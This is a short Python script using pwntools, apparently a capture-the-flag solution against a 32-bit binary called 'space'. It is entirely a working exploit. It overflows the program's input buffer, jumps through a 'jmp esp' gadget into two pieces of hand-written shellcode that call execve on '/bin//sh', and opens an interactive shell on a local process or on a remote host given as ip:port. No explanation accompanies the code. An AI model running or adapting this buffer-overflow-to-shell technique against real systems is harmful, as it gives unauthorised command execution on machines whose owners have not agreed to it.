#!/usr/bin/env python3

from pwn import asm, context, log, p32, process, remote, ROP, sys, u32

log.warning(f'Usage: python3 {sys.argv[0]} [ip:port]')

context.binary = 'space'

rop = ROP(context.binary)
eip = p32(rop.jmp_esp.address)  # 0x0804919f

shellcode1 = asm('''
  xor  ecx, ecx
  push 0xb
  pop  eax
  push ecx
  jmp  $+11
''')

shellcode2 = asm(f'''
  xor  edx, edx
  push {u32(b"//sh")}  # 0x68732f2f
  push {u32(b"/bin")}  # 0x6e69622f
  mov  ebx, esp
  int  0x80
  nop
  nop
''')

payload = shellcode2 + eip + shellcode1

if len(sys.argv) > 1:
    ip, port = sys.argv[1].split(':')
    p = remote(ip, port)
else:
    p = process(context.binary.path)

p.sendlineafter(b'> ', payload)
p.interactive()
